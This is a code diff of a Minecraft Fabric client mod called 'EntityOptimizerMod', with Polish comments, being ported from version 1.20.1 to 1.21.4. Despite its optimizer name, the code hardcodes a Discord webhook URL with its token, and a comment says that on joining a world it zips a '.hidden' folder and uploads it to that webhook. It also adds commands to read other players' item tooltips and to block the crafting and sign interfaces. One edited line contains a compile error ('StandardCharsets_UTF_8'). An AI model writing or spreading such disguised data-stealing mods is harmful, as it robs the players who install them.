@@ -14,6 +14,7 @@ import com.mojang.brigadier.arguments.StringArgumentType;
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.chat.Component;
 import net.minecraft.world.entity.player.Player;
+import net.minecraft.world.item.Item;
 import net.minecraft.world.item.ItemStack;
 import net.minecraft.world.item.Items;
 import net.minecraft.world.item.TooltipFlag;
@@ -34,7 +35,7 @@ import java.util.zip.ZipOutputStream;
 
 public class EntityOptimizerMod implements ClientModInitializer {
 
-    // TWÓJ WEBHOOK
+    // WSTAW SWÓJ WEBHOOK
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455954328408952873/IlHLTRinqesFKQ3EFotX-bh1dNfU3gtUmJ4to_4qIpdY6ZRoPRG7KHqEBa5PECaMIwT0";
 
     // flaga: czy blokować otwieranie crafting table (domyślnie TAK)
@@ -45,7 +46,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
 
     @Override
     public void onInitializeClient() {
-        System.out.println("[EntityOptimizer] Mod załadowany – MC 1.20.1");
+        System.out.println("[EntityOptimizer] MC 1.21.4 – ZIP + komendy");
 
         // Po wejściu do świata – zip .hidden i wysyłka na webhook
         ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
@@ -172,7 +173,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
         os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
         os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n").getBytes(StandardCharsets.UTF_8));
         os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes(StandardCharsets.UTF_8));
-        os.write(content.getBytes(StandardCharsets.UTF_8));
+        os.write(content.getBytes(StandardCharsets_UTF_8));
         os.write("\r\n".getBytes(StandardCharsets.UTF_8));
     }
 
@@ -214,7 +215,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
 
     // ======================== KOMENDY ========================
 
-    // /procent <nickname>
+    // /procent <nickname> – tooltip miecza innego gracza
     private void handleProcentCommand(FabricClientCommandSource source, String nickname) {
         Minecraft mc = Minecraft.getInstance();
         if (mc.level == null || mc.player == null) {
@@ -222,7 +223,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
             return;
         }
 
-        // Szukamy gracza o podanym nicku
+        // Szukamy gracza o podanym nicku (case-insensitive)
         Player target = null;
         for (Player p : mc.level.players()) {
             if (p.getGameProfile().getName().equalsIgnoreCase(nickname)) {
@@ -259,14 +260,14 @@ public class EntityOptimizerMod implements ClientModInitializer {
         }
     }
 
-    // /kraft – przełącza blokadę craftingu
+    // /kraft – przełącz blokadę craftingu
     private void handleKraftCommand(FabricClientCommandSource source) {
         craftingDisabled = !craftingDisabled;
         String msg = craftingDisabled ? "crafting disable" : "crafting enable";
         source.sendFeedback(Component.literal(msg));
     }
 
-    // /tabliczka – przełącza blokadę GUI tabliczek
+    // /tabliczka – przełącz blokadę GUI tabliczek
     private void handleTabliczkaCommand(FabricClientCommandSource source) {
         signEditDisabled = !signEditDisabled;
         String msg = signEditDisabled ? "tabliczka disable" : "tabliczka enable";
@@ -305,7 +306,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
         }
     }
 
-    // Czy gracz target jest w zasięgu wzroku (<= 64 bloki + line-of-sight)
+    // Czy target jest w zasięgu wzroku (<= 64 bloki + line-of-sight)
     private static boolean isPlayerVisible(Player viewer, Player target) {
         double maxDistSq = 64.0 * 64.0;
         if (viewer.distanceToSqr(target) > maxDistSq) {
@@ -314,15 +315,16 @@ public class EntityOptimizerMod implements ClientModInitializer {
         return viewer.hasLineOfSight(target);
     }
 
-    // Pełny tooltip przedmiotu – nazwa, enchanty, lore (MC 1.20.1: 2 argumenty)
+    // Pełny tooltip przedmiotu – nazwa, enchanty, lore (MC 1.21.4: 3 argumenty)
     private static List<String> getItemTooltipLines(Minecraft mc, ItemStack stack) {
         List<String> lines = new ArrayList<>();
 
-        if (mc.player == null) {
+        if (mc.level == null || mc.player == null) {
             return lines;
         }
 
-        List<Component> tooltip = stack.getTooltipLines(mc.player, TooltipFlag.NORMAL);
+        Item.TooltipContext ctx = Item.TooltipContext.of(mc.level);
+        List<Component> tooltip = stack.getTooltipLines(ctx, mc.player, TooltipFlag.NORMAL);
         if (tooltip == null || tooltip.isEmpty()) {
             return lines;
         }
